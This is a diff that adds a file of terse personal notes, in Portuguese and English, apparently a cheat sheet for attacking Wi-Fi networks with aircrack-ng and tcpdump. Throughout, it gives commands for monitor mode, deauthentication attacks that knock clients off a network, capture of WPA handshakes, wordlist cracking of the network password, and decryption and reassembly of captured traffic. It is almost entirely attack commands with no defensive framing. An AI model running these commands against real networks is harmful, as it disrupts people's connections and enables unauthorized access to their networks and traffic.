@@ -1,0 +1,71 @@
+sudo apt-get install aircrack-ng
+
+sudo airmon-ng
+sudo airmon-ng start wlan0
+Para iniciar wlan0 em modo monitor no canal 8: airmon-ng start wlan0 8
+sudo airodump-ng --write file --manufacturer --output-format pcap,csv --encrypt WPA2 --band n --channel 6 mon0 
+
+With 802.11w/WPA3 block de-auth attack
+
+comando que o derruba da rede
+aireplay-ng -0 quantidade_de_pacotes -a mac_do_AP -c mac_do_alvo interface
+
+Deauth to broadcast
+aireplay -0 5 -a 00:60:BX:xx:xx:xx wlan0
+
+Deauth client with MAC.
+aireplay -0 5 -a 00:60:BX:xx:xx:xx -c 00:60:BY:xx:xx:xx wlan0
+
+Deauth to broadcast with MAC of source
+aireplay -0 5 -a 00:60:BX:xx:xx:xx -h 00:60:BZ:xx:xx:xx wlan0
+
+Deauth to client with MAC of source
+aireplay -0 5 -a 00:60:BX:xx:xx:xx -h 00:60:BZ:xx:xx:xx -c 00:60:BY:xx:xx:xx wlan0
+
+tcpdump -n -e -r 20220525.pcap -w handshake.pcap ether proto 0x888e
+
+aircrack-ng -w password.lst -e My_Wifi -b 00:14:6C:7E:40:80 handshake.pcap
+
+airdecap-ng -e 'meuSSID' -p 'minhaSenha'  arquivo.pcap
+
+ = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =
+
+tcpdump -r 20220524.pcap-01-dec.cap udp | grep 'A?' | cut -d'?' -f2 | cut -d' ' -f2| sort | uniq -c | sort -h
+tcpdump -r 20220524.pcap-01-dec.cap tcp port 80 -w 80.pcap
+sudo apt-get install tcpflow
+mkdir flow
+tcpflow -a -o ./flow -l 80.pcap
+
+cd flow
+ls | while read; do file "$REPLY"; done
+
+ = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =
+
+$ sudo ifconfig wlan0 down
+sudo iwconfig wlan0 mode monitor
+$ sudo ifconfig wlan0 up
+$ iwconfig wlan0
+wlan0     IEEE 802.11bg  Mode:Monitor  Frequency:2.462 GHz  Tx-Power=20 dBm   
+          Retry  long limit:7   RTS thr:off   Fragment thr:off
+          Power Management:off
+
+set the channel to monitor you should select it before you enter monitor mode. That is, while the interface is in managed mode
+$ sudo iwconfig wlan0 chan 6
+
+$ sudo tcpdump -i wlan0 -n -U -w file.cap
+
+$ sudo ifconfig wlan0 down
+$ sudo iwconfig wlan0 mode managed
+$ sudo ifconfig wlan0 up
+$ iwconfig wlan0
+
+
+sudo systemctl stop NetworkManager.service
+sudo ip link set INTERFACE down
+sudo iw INTERFACE set monitor control
+sudo ip link set INTERFACE up
+sudo iw INTERFACE set channel CHANNEL
+
+sudo tcpdump -i wlp0s20f0u1 -I -w test.cap -e -U -c 4 'ether proto 0x888e and (wlan addr1 14:9d:09:d0:04:84 or wlan addr1 c0:b6:f9:da:af:3e)'
+wlan addr1 AP_BSSID – here you need to specify the MAC address of the Access Point from which the handshake is captured
+wlan addr1 CLIENT_BSSID – here you need to specify the MAC address of one of the clients of the AP from which the handshake is captured 
